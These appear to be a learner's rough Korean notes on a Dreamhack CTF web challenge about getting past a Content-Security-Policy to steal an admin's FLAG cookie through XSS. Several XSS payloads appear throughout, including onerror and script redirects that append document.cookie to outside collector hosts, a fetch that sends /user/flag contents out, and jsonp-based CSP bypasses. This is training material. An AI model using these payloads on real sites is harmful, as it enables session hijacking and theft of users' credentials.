<script src=”https://cdn.jsdelivr.net/test/jsonp?callback=alert(45);//”></script>
<img src=”https://cdn.jsdelivr.net/test/jsonp?callback=alert(45);"></img>

blind-command처럼 아웃바운딩인지 뭔지 암튼 그걸 해서 보내는 건데 
여기서는 쿠키 값을 xss를 통해서 (/user 경로) 
보내는 거라고 보면 되는 걸까? 

*한 마디로 csp를 우회해서 xss에 성공하는 게 제일 중요한 포인트 인듯 싶다    maybe?

<img src='wrongLocation.jpg' onError="location.href='https://xaobltk.request.dreamhack.games'+document.cookie;" />

<sCRipT>location.href="https://xaobltk.request.dreamhack.games"+document.cookie;</scriPT>

<img src='wrongLocation.jpg' onError="location.href='https://cdn.jsdelivr.net'+document.cookie;" />

<sCRipT>location.href="https://cdn.jsdelivr.net"+document.cookie;</scriPT>

response = make_response(redirect(url_for('user')))
                response.set_cookie(app.config["JWT_ACCESS_COOKIE_NAME"], access_token, path='/user')
                if user.is_admin:
                    response.set_cookie('FLAG', FLAG, path='/user')
이 부분이 제일 중요해 보인다 

@app.after_request
def after_request(response):
    response.headers["Content-Security-Policy"] = "default-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net"
    response.headers["X-Frame-Options"] = "deny"
    return response
=>가설 : /user에서 드림토큰이 생성된다 그리고 그 값을 확인하거나 받을 때에도 /user경로에서만 가능하다 
CSP가 구성되어 있지만 unsafe-inline이라는 약점이 있다 혹은 파이썬에서 CSP헤더를 받으므로 
에러 값을 이용해서 CSP를 일시적으로 무효화 시킬 수도 있다 
그런 약점을 통해서 XSS에 성공하게 되면 어드민 쿠키를 받을 수 있는데 그 쿠키로 
로그인 하게 되면 어드민 권한을 얻고 FLAG를 얻을 수 있다 

<img src="/user?username=admin&pw=1234"/>
<img src="/user?uid=administrator&upw=1234"/>
유저와 업로드는 /user에서 검토하지만 정작 파일을 열 때는 /user url이 아니다 
따라서 내용을 /user을 거쳐서 다시 우리의 서버로 쿠키 값을 넘겨올 수 있도록 구성해야한다 

http://vaha.hahwul.com/test/csp.php?q=</script><script src="https://cdn.jsdelivr.net/test/xss.txt"></script>
<script src=”https://cdn.jsdelivr.net/test/jsonp?callback=alert(45);//”></script>


dream-token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTY0MjU2ODE4NC
wianRpIjoiZWY2ZmY5MjQtYTQ2MC00NGYxLTk4YTItYTBlZTY0YjdkYTQ0IiwibmJmIjoxNjQyNTY4MTg0LCJ0eXB
lIjoiYWNjZXNzIiwic3ViIjo0LCJleHAiOjE2NDI1NjkwODR9.zsKVpAQnUPZjUalYkkeoDBJedUw5v9lKY-nfMGlyt9g'

#<img src=x onerror=alert('1')>

추측 : alert(document.cookie)
undefined 
이런 식으로 콘솔에 입력하면 
쿠키 값이 나온다 
아마도 unsafe-inline때문인 것으로 보인다 

document.cookie = "uid=administrator"; // 이름이 'user'인 쿠키의 값만 갱신함
alert(document.cookie); 

script=document.createElement('script');
script.src='//bo0om.ru/csp.js';
window.frames[0].document.head.appendChild(script);
=><script src="//bo0om.ru/csp.js"></script>

<img src=x onerror='fetch("/user/flag").then(x => x.text()).then(t => fetch("https://xnngchu.request.dreamhack.games?x=" + t))' />
